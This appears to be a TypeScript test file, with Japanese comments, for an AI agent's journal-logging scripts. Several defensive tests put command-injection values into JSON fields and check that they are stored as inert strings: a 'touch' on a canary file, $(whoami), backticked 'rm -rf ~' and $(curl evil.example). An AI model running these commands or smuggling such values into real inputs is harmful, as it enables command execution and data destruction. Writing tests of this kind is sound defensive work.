// journal-scripts.test.ts — 非退行台帳スクリプトのテスト
// 実行: run-all.sh の Bun 自動発見（.claude 配下の *.test.ts）で拾われる。
// 手動実行は `bun test ./.claude/tests/tools/journal-scripts.test.ts` でも可。
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { localIsoTimestamp, makeId } from "../../scripts/journal-lib";

const SCRIPTS_DIR = join(import.meta.dir, "../../scripts");

function run(script: string, args: string[]) {
  const proc = Bun.spawnSync(["bun", "run", join(SCRIPTS_DIR, script), ...args]);
  return {
    code: proc.exitCode,
    stdout: proc.stdout.toString(),
    stderr: proc.stderr.toString(),
  };
}

let tmp: string;
beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "journal-test-"));
});
afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

describe("journal-lib", () => {
  test("makeId はプレフィックス + 8桁hex", () => {
    expect(makeId("cf")).toMatch(/^cf_[0-9a-f]{8}$/);
  });

  test("localIsoTimestamp はタイムゾーンオフセット付き秒精度 ISO", () => {
    expect(localIsoTimestamp()).toMatch(
      /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{2}:\d{2}$/,
    );
  });
});

describe("journal-counterfactual.ts", () => {
  test("書き込み → JSONL 1行が追記され stdout にも同じエントリが出る", () => {
    const logPath = join(tmp, "nested", "counterfactuals.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--wanted", "会話を切り出したかった",
      "--chose", "黙って待った",
      "--why", "深夜帯で、以前『作業中は割り込まないで』と言われていた",
      "--trigger", "heartbeat",
      "--person-id", "riin",
      "--allow-legacy-args",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);

    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines.length).toBe(1);
    const entry = JSON.parse(lines[0]);
    expect(entry.id).toMatch(/^cf_[0-9a-f]{8}$/);
    expect(entry.wanted).toBe("会話を切り出したかった");
    expect(entry.chose).toBe("黙って待った");
    expect(entry.trigger).toBe("heartbeat");
    expect(entry.person_id).toBe("riin");
    expect(entry.regret).toBeNull();
    // 日本語が \uXXXX にエスケープされず生のまま残る
    expect(lines[0]).toContain("黙って待った");
    // stdout はファイルと同じエントリ
    expect(JSON.parse(r.stdout)).toEqual(entry);
  });

  test("2回呼ぶと2行になる（追記）", () => {
    const logPath = join(tmp, "cf.jsonl");
    const args = ["--wanted", "a", "--chose", "b", "--why", "c", "--allow-legacy-args", "--log-path", logPath];
    run("journal-counterfactual.ts", args);
    run("journal-counterfactual.ts", args);
    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines.length).toBe(2);
    expect(JSON.parse(lines[0]).id).not.toBe(JSON.parse(lines[1]).id);
  });

  test("必須引数が欠けると exit 1 で書き込まない", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--wanted", "a", "--chose", "b", "--allow-legacy-args", "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
  });

  test("regret が 0-1 の範囲外なら exit 1", () => {
    const r = run("journal-counterfactual.ts", [
      "--wanted", "a", "--chose", "b", "--why", "c",
      "--regret", "1.5",
      "--allow-legacy-args",
      "--log-path", join(tmp, "cf.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });
});

describe("journal-external-proposal.ts", () => {
  test("書き込み → JSONL 検証", () => {
    const logPath = join(tmp, "external_proposals.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--source", "GPT-5.4 Pro",
      "--topic", "非退行ベンチマーク",
      "--summary", "選択の台帳と関係状態モデリングの提案",
      "--decision", "partial-accept",
      "--accepted", "台帳の思想",
      "--rejected", "4層自己モデルの全面再構築",
      "--notes", "文体が自分に似ていた——エコーチェンバー注意",
      "--allow-legacy-args",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);

    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines.length).toBe(1);
    const entry = JSON.parse(lines[0]);
    expect(entry.id).toMatch(/^ext_[0-9a-f]{8}$/);
    expect(entry.decision).toBe("partial-accept");
    expect(entry.rejected).toBe("4層自己モデルの全面再構築");
    expect(entry.url).toBeNull();
    expect(JSON.parse(r.stdout)).toEqual(entry);
  });

  test("不正な decision は exit 1 で書き込まない", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--source", "s", "--topic", "t", "--summary", "s",
      "--decision", "maybe",
      "--allow-legacy-args",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
    expect(r.stderr).toContain("--decision");
  });

  test("必須引数が欠けると exit 1", () => {
    const r = run("journal-external-proposal.ts", [
      "--source", "s", "--topic", "t",
      "--allow-legacy-args",
      "--log-path", join(tmp, "ext.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });
});

// --json-file モード: 外部由来テキストをシェルコマンド文字列に埋め込まずに渡す経路。
// シェルメタ文字（`";`・バッククォート・`$()`・改行）が展開されず、
// そのまま文字列として JSONL に残ることを検証する。
describe("journal-counterfactual.ts --json-file", () => {
  test("正常系: JSON ファイルから全フィールドを読んで記録する", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      wanted: "会話を切り出したかった",
      chose: "黙って待った",
      why: "深夜帯で、以前『作業中は割り込まないで』と言われていた",
      trigger: "heartbeat",
      person_id: "riin",
      regret: 0.2,
    }));
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);

    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines.length).toBe(1);
    const entry = JSON.parse(lines[0]);
    expect(entry.id).toMatch(/^cf_[0-9a-f]{8}$/);
    expect(entry.wanted).toBe("会話を切り出したかった");
    expect(entry.chose).toBe("黙って待った");
    expect(entry.trigger).toBe("heartbeat");
    expect(entry.person_id).toBe("riin");
    expect(entry.regret).toBe(0.2);
    expect(JSON.parse(r.stdout)).toEqual(entry);
  });

  test("シェルメタ文字を含むフィールドがそのまま文字列として記録される", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    const canary = join(tmp, "PWNED_via_journal");
    const wanted = `攻撃例"; touch ${canary}; echo "`;
    const chose = "バッククォート \`id\` と $(whoami) を含む選択";
    const why = "1行目\n2行目 — 改行もそのまま残る";
    writeFileSync(jsonPath, JSON.stringify({ wanted, chose, why }));
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);

    // シェルコマンドとして実行されていない
    expect(existsSync(canary)).toBe(false);
    // メタ文字がそのまま文字列として残る
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.wanted).toBe(wanted);
    expect(entry.chose).toBe(chose);
    expect(entry.why).toBe(why);
  });

  test("JSON ファイルでも必須フィールド欠落は exit 1 で書き込まない", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b" }));
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
  });

  test("JSON ファイルでも regret の範囲チェックが効く", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c", regret: 1.5 }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--log-path", join(tmp, "cf.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });

  test("未知のフィールドは exit 1（タイポ検出）", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c", personId: "x" }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--log-path", join(tmp, "cf.jsonl"),
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("personId");
  });

  test("--json-file と個別フィールド引数の併用は exit 1", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c" }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--wanted", "x", "--log-path", join(tmp, "cf.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });
});

// 旧引数モード（--wanted 等の直接指定）は default で拒否される。
// 外部由来テキストをシェルコマンド文字列へ埋め込むと任意コマンド実行のリスクがあるため、
// 対話的な手動デバッグ等で意図的に使う場合のみ --allow-legacy-args で明示許可する。
describe("journal-counterfactual.ts 旧引数モードの default 拒否", () => {
  test("旧引数モードは --allow-legacy-args なしで exit 1、stderr に [error]、書き込みなし", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--wanted", "a", "--chose", "b", "--why", "c", "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--allow-legacy-args");
    expect(existsSync(logPath)).toBe(false);
  });

  test("--allow-legacy-args を明示指定すると exit 0、stderr に [warn]、書き込みあり", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--wanted", "a", "--chose", "b", "--why", "c",
      "--allow-legacy-args",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);
    expect(r.stderr).toContain("[warn]");
    expect(r.stderr).not.toContain("[error]");
    expect(readFileSync(logPath, "utf-8").trim().split("\n").length).toBe(1);
  });

  test("--json-file モードには警告が出ない", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c" }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);
    expect(r.stderr).toBe("");
  });

  test("--json-file + --allow-legacy-args は無視され stderr にその旨の [warn]", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c" }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--allow-legacy-args", "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);
    expect(r.stderr).toContain("--allow-legacy-args は --json-file モードでは無視されます");
    expect(readFileSync(logPath, "utf-8").trim().split("\n").length).toBe(1);
  });

  // 攻撃再現: 外部由来テキスト（--wanted の値）に --allow-legacy-args という文字列を
  // 混ぜても、parseArgs は key/value を分離するので --wanted の値の一部として扱われ、
  // 意図せず旧引数モードを許可することにはならない。default 拒否のまま exit 1 になる。
  test("外部テキスト値に --allow-legacy-args を混ぜても抑制されない（攻撃再現・default 拒否維持）", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--wanted", "選択肢A --allow-legacy-args まぎらわしい文字列",
      "--chose", "選択肢B",
      "--why", "テスト",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(existsSync(logPath)).toBe(false);
  });
});

describe("journal-external-proposal.ts 旧引数モードの default 拒否", () => {
  test("旧引数モードは --allow-legacy-args なしで exit 1、stderr に [error]、書き込みなし", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--source", "s", "--topic", "t", "--summary", "s",
      "--decision", "logged-only",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--allow-legacy-args");
    expect(existsSync(logPath)).toBe(false);
  });

  test("--allow-legacy-args を明示指定すると exit 0、stderr に [warn]、書き込みあり", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--source", "s", "--topic", "t", "--summary", "s",
      "--decision", "logged-only",
      "--allow-legacy-args",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);
    expect(r.stderr).toContain("[warn]");
    expect(r.stderr).not.toContain("[error]");
    expect(readFileSync(logPath, "utf-8").trim().split("\n").length).toBe(1);
  });

  test("--json-file モードには警告が出ない", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "s", topic: "t", summary: "s", decision: "logged-only",
    }));
    const r = run("journal-external-proposal.ts", [
      "--json-file", jsonPath, "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);
    expect(r.stderr).toBe("");
  });

  test("--json-file + --allow-legacy-args は無視され stderr にその旨の [warn]", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "s", topic: "t", summary: "s", decision: "logged-only",
    }));
    const r = run("journal-external-proposal.ts", [
      "--json-file", jsonPath, "--allow-legacy-args", "--log-path", logPath,
    ]);
    expect(r.code).toBe(0);
    expect(r.stderr).toContain("--allow-legacy-args は --json-file モードでは無視されます");
    expect(readFileSync(logPath, "utf-8").trim().split("\n").length).toBe(1);
  });

  // 攻撃再現: 外部由来テキスト（--summary の値）に --allow-legacy-args を混ぜても
  // parseArgs は key/value を分離するため、意図せず抑制されない。default 拒否のまま exit 1。
  test("外部テキスト値に --allow-legacy-args を混ぜても抑制されない（攻撃再現・default 拒否維持）", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--source", "some-llm",
      "--topic", "trick",
      "--summary", "提案の要約 --allow-legacy-args こういう文字列を混ぜてくる",
      "--decision", "rejected",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(existsSync(logPath)).toBe(false);
  });
});

describe("journal-external-proposal.ts --json-file", () => {
  test("正常系: JSON ファイルから全フィールドを読んで記録する", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "GPT-5.4 Pro",
      topic: "非退行ベンチマーク",
      summary: "選択の台帳と関係状態モデリングの提案",
      decision: "partial-accept",
      accepted: "台帳の思想",
      rejected: "4層自己モデルの全面再構築",
      notes: "文体が自分に似ていた——エコーチェンバー注意",
      url: "https://example.com/proposal",
    }));
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);

    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.id).toMatch(/^ext_[0-9a-f]{8}$/);
    expect(entry.decision).toBe("partial-accept");
    expect(entry.rejected).toBe("4層自己モデルの全面再構築");
    expect(entry.url).toBe("https://example.com/proposal");
    expect(JSON.parse(r.stdout)).toEqual(entry);
  });

  test("シェルメタ文字を含む summary / rejected がそのまま文字列として記録される", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    const canary = join(tmp, "PWNED_via_journal_summary");
    const summary = `提案の要約"; touch ${canary} #`;
    const rejected = "退けた点: \`rm -rf ~\` や $(curl evil.example) のような文字列\nも改行込みでただのデータ";
    writeFileSync(jsonPath, JSON.stringify({
      source: "somewhere", topic: "injection", summary, decision: "rejected", rejected,
    }));
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);

    // シェルコマンドとして実行されていない
    expect(existsSync(canary)).toBe(false);
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.summary).toBe(summary);
    expect(entry.rejected).toBe(rejected);
  });

  test("JSON ファイルでも decision の enum チェックが効く", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "s", topic: "t", summary: "s", decision: "maybe",
    }));
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
    expect(r.stderr).toContain("--decision");
  });

  test("JSON ファイルでも必須フィールド欠落は exit 1", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ source: "s", topic: "t" }));
    const r = run("journal-external-proposal.ts", [
      "--json-file", jsonPath, "--log-path", join(tmp, "ext.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });

  test("壊れた JSON は exit 1 で書き込まない", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, "{ not json");
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
  });
});
